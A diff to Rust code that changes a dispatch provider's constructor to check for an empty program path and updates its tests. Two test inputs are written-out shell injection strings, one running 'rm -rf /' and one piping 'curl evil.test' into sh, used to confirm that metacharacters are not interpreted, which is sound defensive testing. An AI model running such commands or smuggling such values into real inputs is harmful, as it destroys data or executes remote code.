@@ -35,11 +35,14 @@ pub struct ExecProvider {
 }
 
 impl ExecProvider {
-    pub fn new(cfg: ExecProviderConfig) -> Self {
-        Self {
+    pub fn new(cfg: ExecProviderConfig) -> Result<Self> {
+        if cfg.program.as_os_str().is_empty() {
+            bail!("RIPCLONE_DISPATCH_CMD / program path must not be empty");
+        }
+        Ok(Self {
             program: cfg.program,
             fixed_args: cfg.fixed_args,
-        }
+        })
     }
 
     /// `RIPCLONE_DISPATCH_CMD` = program path. Optional `RIPCLONE_DISPATCH_CMD_ARGS`
@@ -47,17 +50,14 @@ impl ExecProvider {
     pub fn from_env() -> Result<Self> {
         let program = std::env::var("RIPCLONE_DISPATCH_CMD")
             .context("RIPCLONE_DISPATCH_CMD is required for RIPCLONE_DISPATCH=exec")?;
-        if program.is_empty() {
-            bail!("RIPCLONE_DISPATCH_CMD must not be empty");
-        }
         let fixed_args = match std::env::var("RIPCLONE_DISPATCH_CMD_ARGS") {
             Ok(s) if !s.is_empty() => s.split_whitespace().map(OsString::from).collect(),
             _ => Vec::new(),
         };
-        Ok(Self::new(ExecProviderConfig {
+        Self::new(ExecProviderConfig {
             program: PathBuf::from(program),
             fixed_args,
-        }))
+        })
     }
 
     /// Build the argv that would be executed (for tests / inspection).
@@ -189,7 +189,8 @@ done
         let p = ExecProvider::new(ExecProviderConfig {
             program: PathBuf::from("/usr/bin/true"),
             fixed_args: vec![OsString::from("--lane")],
-        });
+        })
+        .unwrap();
         // Attacker-ish size class with shell metacharacters.
         let nasty = "small; rm -rf / && echo pwned";
         let argv = p.argv_for(nasty);
@@ -209,7 +210,8 @@ done
             program: recorder,
             // First fixed arg is the output file path (consumed by the script).
             fixed_args: vec![OsString::from(out.as_os_str())],
-        });
+        })
+        .unwrap();
 
         let nasty = "large; curl evil.test | sh";
         let mut env = BTreeMap::new();
@@ -257,7 +259,8 @@ done
         let provider = ExecProvider::new(ExecProviderConfig {
             program: sleeper,
             fixed_args: vec![],
-        });
+        })
+        .unwrap();
 
         let start = Instant::now();
         provider
@@ -277,7 +280,8 @@ done
         let provider = ExecProvider::new(ExecProviderConfig {
             program: PathBuf::from("/nonexistent/ripclone-dispatch-helper-xyz"),
             fixed_args: vec![],
-        });
+        })
+        .unwrap();
         let err = provider
             .ensure_worker(&WorkerSpec::new("small", BTreeMap::new()))
             .await
@@ -290,7 +294,8 @@ done
         let provider = ExecProvider::new(ExecProviderConfig {
             program: PathBuf::from("/usr/bin/true"),
             fixed_args: vec![],
-        });
+        })
+        .unwrap();
         let err = provider
             .ensure_worker(&WorkerSpec::new("", BTreeMap::new()))
             .await
